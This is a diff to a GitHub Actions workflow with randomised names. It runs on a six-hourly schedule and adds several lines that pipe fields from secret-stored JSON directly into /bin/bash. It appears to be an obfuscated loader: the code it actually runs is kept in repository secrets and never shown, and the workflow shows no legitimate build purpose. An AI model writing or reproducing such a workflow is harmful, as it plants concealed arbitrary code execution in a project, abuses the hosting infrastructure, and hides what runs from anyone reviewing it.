@@ -1,19 +1,22 @@
 name: longfeishu2123
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '55 1/6 * * *'
-
-jobs:  # 16366
+    - cron: '19 4/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: longfeishu2123
         env:
-          y62: ${{ secrets.y62 }}
+          mnsqf29: ${{ secrets.mnsqf29 }}
         run: |
-          echo $y62 | jq -r .kv599 | /bin/bash
-          echo $csv086 | jq -r .anzek50 | /bin/bash
+          echo $mnsqf29 | jq -r .kggqw7372 | /bin/bash
+          echo $qzicb9650 | jq -r .xdtvy4 | /bin/bash
+          echo $spzr7 | jq -r .ypo74061 | /bin/bash
+          echo $g308 | jq -r .vc4599 | /bin/bash
+          echo $oewhz607 | jq -r .ivqq9371 | /bin/bash
+          echo $e56 | jq -r .beztc64 | /bin/bash
+          echo $jpyk1 | jq -r .i04 | /bin/bash
 
